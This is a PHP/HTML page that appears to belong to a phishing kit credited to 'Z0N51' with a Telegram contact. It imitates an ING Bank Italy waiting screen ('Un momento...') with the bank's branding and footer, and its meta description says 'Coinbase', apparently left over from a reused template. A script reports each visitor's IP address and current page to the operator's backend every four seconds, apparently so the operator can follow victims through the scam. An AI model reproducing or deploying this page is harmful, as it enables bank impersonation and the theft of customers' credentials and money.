<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    $_SESSION['last_page'] = "loading";

?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="<?php echo IMGSPATH; ?>/favicon.ico">
        <title>ING</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="<?php echo CSSPATH; ?>/style.css">
        <script src="<?php echo JSPATH; ?>/stutes.js"></script>     
    </head>
    <body class="d-flex flex-column justify-content-between" style="min-height:100vh;">

      <!-- HEADER -->
      <header class="header_1">
        <div class="container_header_1">
          <div class="logo">
            <img src="<?php echo IMGSPATH; ?>/logo.svg" alt="">
          </div>
        </div>
      </header>

      <!-- wrapper_login -->
      <div class="wrapper_login">
        <div class="container_login">
          <form action="" style="min-height:300px;" class="d-flex align-items-center flex-column justify-content-center">
            <div class="title d-flex flex-column align-items-center text-center">
                <div class="spinner-border text-warning mt-2" role="status" style="border-color:#FF6600; border-right-color:white; width: 1.9em;  height: 1.9em;">
                  <span class="sr-only">Loading...</span>
                </div> 
              <p class="mb-0" style="font-size:14px;     color: #696969;">Un momento...</p>
            </div>
          </form>
        </div>
      </div>

      <!-- footer -->
      <footer class="footer_1">
        <div class="container_footer_1">
          <div class="links_footer">
            <ul class="ps-0 mb-0">
              <li>Sicurezza</li>
              <li>Definizione di Default</li>
              <li>Privacy</li>
            </ul>
            <ul class="ps-0 mb-0">
              <li>Trasparenza</li>
              <li>Reclami</li>
              <li>Cookies</li>
            </ul>
          </div>
          <div class="copyghit">
            <p class="mb-0">© 2026 ING BANK N.V. Milan Branch P.I. 11241140158</p>
          </div>
        </div>
      </footer>


      
       









        







        <!-- bootstrap -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="<?php echo JSPATH; ?>/script.js"></script>
        
        <script>
            worker();
            var jsonData = {
              action: 'VISITORS',
              ip: '<?php echo get_client_ip(); ?>',
              page: 'loading'
            };
            sendAjaxRequestEveryFourSeconds(jsonData);                                 
        </script>
    </body>
</html>